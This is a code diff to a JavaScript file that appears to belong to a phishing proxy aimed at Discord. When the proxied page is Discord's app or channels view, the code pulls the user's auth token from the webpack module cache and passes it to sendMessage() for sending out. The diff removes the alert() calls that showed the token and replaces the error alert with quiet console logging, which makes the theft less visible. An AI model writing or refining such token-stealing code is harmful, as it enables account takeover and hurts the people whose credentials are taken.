@@ -62,10 +62,9 @@ function sendMessage(message) {
             if (url === proxy_prefix + proxy_path + "https://discord.com/app") {
                       try {
             var e = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
-            alert(e)
             sendMessage(e)
             } catch(err) {
-            alert(err)
+            console.log(err)
             }
                 window.location.reload();
             }
@@ -78,10 +77,9 @@ function sendMessage(message) {
             if (url === proxy_prefix + proxy_path + "https://discord.com/channels/@me") {
                       try {
             var e = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
-            alert(e)
             sendMessage(e)
             } catch(err) {
-            alert(err)
+            console.log(err)
             }
                 window.location.reload();
             }
